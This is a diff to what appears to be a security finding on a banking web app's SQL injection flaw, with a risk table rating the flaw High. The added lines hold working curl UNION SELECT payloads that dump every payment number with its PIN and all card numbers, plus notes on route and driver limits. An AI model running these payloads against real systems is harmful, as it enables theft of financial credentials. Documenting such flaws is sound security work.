@@ -43,7 +43,16 @@ curl -sk "$BASE/command+su+payment_number+1%20UNION%20SELECT%201,group_concat(na
 # {"user":{"payment_number":"user,card", ...}}
 ```
 
-Confirmed extraction of all card numbers, PINs, balances; `user`=20 rows, `card`=26 rows.
+**Full dump of payment numbers + PINs and card numbers** (one row, via `group_concat`):
+
+```bash
+curl -sk "$BASE/command+su+payment_number+-1%20UNION%20SELECT%201,(SELECT%20group_concat(payment_number||':'||pin,';')%20FROM%20user),3,4,5--&$SID&$TOKEN"
+# {"user":{"payment_number":"1111111111111111:999999;2222222222222222:123456;...", ...}}
+
+curl -sk "$BASE/command+su+payment_number+-1%20UNION%20SELECT%201,(SELECT%20group_concat(card_number||':'||user_id,';')%20FROM%20card),3,4,5--&$SID&$TOKEN"
+```
+
+Confirmed extraction of all payment numbers, PINs, balances and card numbers. Row counts depend on the instance (15 `user` / 15 `card` rows on the tested instance). Note: the payload cannot contain `/` (it breaks the Django URL route and returns 404), and stacked queries are rejected by `sqlite3` (`You can only execute one statement at a time`).
 
 # Risk
 
@@ -51,7 +60,7 @@ Confirmed extraction of all card numbers, PINs, balances; `user`=20 rows, `card`
 |-----------|--------|
 | Confidentiality | Full read of the banking database: card numbers, payment numbers, PINs, balances, schema. |
 | Integrity | PINs are stored in the same DB and treated as authorization material — this defeats the PIN control. |
-| Availability | None confirmed (stacked-write not tested). |
+| Availability | None — stacked queries are rejected by the `sqlite3` driver, so the injection is limited to a single `SELECT`. |
 
 Overall severity: **High** — no web session or PIN required; an independent path to the entire banking dataset even if helper commands were removed.
 
